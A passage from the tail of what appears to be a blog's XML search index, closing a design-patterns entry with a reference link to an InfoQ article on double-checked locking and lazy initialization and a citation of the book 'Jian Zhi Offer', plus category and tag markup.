href="http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization" target="_blank" rel="noopener">InfoQ的双重检查锁定与延迟初始化<br /></a></li><li>《剑指offer》（第二版）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
